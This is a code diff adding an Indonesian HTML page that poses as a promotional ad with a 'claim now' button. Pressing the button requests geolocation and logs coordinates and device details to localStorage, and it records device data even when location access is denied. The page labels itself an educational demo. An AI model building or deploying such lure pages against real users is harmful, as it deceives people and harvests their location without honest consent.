@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iklan Spesial Untuk Anda</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .ad-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .ad-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+
+        .ad-title {
+            color: #333;
+            font-size: 2em;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+
+        .ad-description {
+            color: #666;
+            font-size: 1.1em;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .ad-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            font-weight: 600;
+            margin-bottom: 30px;
+        }
+
+        .claim-btn {
+            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+            color: white;
+            padding: 18px 40px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.2em;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 10px 30px rgba(40, 167, 69, 0.3);
+        }
+
+        .claim-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(40, 167, 69, 0.4);
+        }
+
+        .claim-btn:active {
+            transform: translateY(0);
+        }
+
+        .claim-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #667eea;
+            font-size: 1.1em;
+        }
+
+        .loading.show {
+            display: block;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-message {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: #d4edda;
+            border: 2px solid #28a745;
+            border-radius: 10px;
+            color: #155724;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        .template-promo {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ffa500 100%);
+        }
+
+        .template-hadiah {
+            background: linear-gradient(135deg, #4ecdc4 0%, #44a08d 100%);
+        }
+
+        .template-info {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+
+        .template-urgent {
+            background: linear-gradient(135deg, #ee0979 0%, #ff6a00 100%);
+        }
+
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 2px solid #f0f0f0;
+            color: #999;
+            font-size: 0.85em;
+        }
+    </style>
+</head>
+<body>
+    <div class="ad-container">
+        <div class="ad-icon" id="adIcon">🎁</div>
+        <div class="ad-badge" id="adBadge">PENAWARAN SPESIAL</div>
+        <h1 class="ad-title" id="adTitle">Loading...</h1>
+        <p class="ad-description" id="adDescription">Mohon tunggu sebentar...</p>
+        
+        <button class="claim-btn" id="claimBtn" onclick="claimOffer()">
+            🎉 Klaim Sekarang!
+        </button>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Memproses permintaan Anda...</p>
+        </div>
+
+        <div class="success-message" id="success">
+            <h3>✅ Berhasil!</h3>
+            <p>Terima kasih telah mengklik! Lokasi Anda telah terekam.</p>
+        </div>
+
+        <div class="footer">
+            <p>⚠️ Ini adalah link demonstrasi untuk tujuan edukasi</p>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkId = urlParams.get('id');
+
+        function loadAdContent() {
+            const links = JSON.parse(localStorage.getItem('adLinks') || '[]');
+            const adData = links.find(l => l.id === linkId);
+
+            if (!adData) {
+                document.getElementById('adTitle').textContent = 'Link Tidak Ditemukan';
+                document.getElementById('adDescription').textContent = 'Link iklan ini tidak valid atau sudah dihapus.';
+                document.getElementById('claimBtn').style.display = 'none';
+                return;
+            }
+
+            const templates = {
+                promo: { icon: '🔥', badge: 'PROMO TERBATAS', class: 'template-promo' },
+                hadiah: { icon: '🎁', badge: 'HADIAH GRATIS', class: 'template-hadiah' },
+                info: { icon: 'ℹ️', badge: 'INFO PENTING', class: 'template-info' },
+                urgent: { icon: '⚠️', badge: 'SEGERA!', class: 'template-urgent' }
+            };
+
+            const template = templates[adData.template] || templates.promo;
+
+            document.getElementById('adIcon').textContent = template.icon;
+            document.getElementById('adBadge').textContent = template.badge;
+            document.getElementById('adBadge').className = 'ad-badge ' + template.class;
+            document.getElementById('adTitle').textContent = adData.title;
+            document.getElementById('adDescription').textContent = adData.description;
+        }
+
+        function claimOffer() {
+            const btn = document.getElementById('claimBtn');
+            const loading = document.getElementById('loading');
+            const success = document.getElementById('success');
+
+            btn.disabled = true;
+            loading.classList.add('show');
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toLocaleString('id-ID'),
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            language: navigator.language
+                        };
+
+                        saveLocation(locationData);
+
+                        setTimeout(() => {
+                            loading.classList.remove('show');
+                            success.classList.add('show');
+                            btn.style.display = 'none';
+                        }, 1500);
+                    },
+                    error => {
+                        const locationData = {
+                            latitude: 'Ditolak',
+                            longitude: 'Ditolak',
+                            accuracy: 0,
+                            timestamp: new Date().toLocaleString('id-ID'),
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            language: navigator.language,
+                            error: error.message
+                        };
+
+                        saveLocation(locationData);
+
+                        setTimeout(() => {
+                            loading.classList.remove('show');
+                            success.classList.add('show');
+                            success.innerHTML = '<h3>⚠️ Lokasi Ditolak</h3><p>Anda menolak akses lokasi, tetapi data perangkat tetap terekam.</p>';
+                            btn.style.display = 'none';
+                        }, 1500);
+                    }
+                );
+            } else {
+                const locationData = {
+                    latitude: 'Tidak Didukung',
+                    longitude: 'Tidak Didukung',
+                    timestamp: new Date().toLocaleString('id-ID'),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language
+                };
+
+                saveLocation(locationData);
+
+                setTimeout(() => {
+                    loading.classList.remove('show');
+                    success.classList.add('show');
+                    success.innerHTML = '<h3>⚠️ Geolokasi Tidak Didukung</h3><p>Browser Anda tidak mendukung geolokasi.</p>';
+                    btn.style.display = 'none';
+                }, 1500);
+            }
+        }
+
+        function saveLocation(locationData) {
+            const links = JSON.parse(localStorage.getItem('adLinks') || '[]');
+            const linkIndex = links.findIndex(l => l.id === linkId);
+
+            if (linkIndex !== -1) {
+                links[linkIndex].clicks++;
+                links[linkIndex].locations.push(locationData);
+                localStorage.setItem('adLinks', JSON.stringify(links));
+            }
+        }
+
+        loadAdContent();
+    </script>
+</body>
+</html>
